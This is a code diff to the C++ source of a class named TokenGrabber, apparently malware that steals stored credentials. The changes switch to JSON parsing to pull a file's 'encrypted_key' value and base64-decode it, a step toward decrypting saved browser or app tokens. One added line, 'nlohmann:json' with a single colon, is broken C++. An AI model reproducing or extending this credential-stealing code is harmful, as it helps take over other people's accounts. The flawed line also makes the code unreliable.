@@ -5,6 +5,8 @@
 
 #include "utils/json/json.hpp"
 
+using json = nlohmann:json;
+
 class TokenGrabber {
 public:
 
@@ -172,12 +174,12 @@ private:
 
         std::string contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
 
-        std::vector<std::string> match_vector;
-        utils::string::match_regex(contents, "\"encrypted_key\":\"([^\"]+)\"", match_vector);
+        json json_contents = nlohmann::json::parse(contents);
+        if (!json_contents.contains("encrypted_key")) {
+            return false;
+        }
 
-        if (match_vector.empty()) { return false; }
-
-        std::string encrypted_key = match_vector[0];
+        std::string encrypted_key = json_contents["encrypted_key"];
 
         std::string decoded64key;
         base64::decode(encrypted_key, decoded64key);
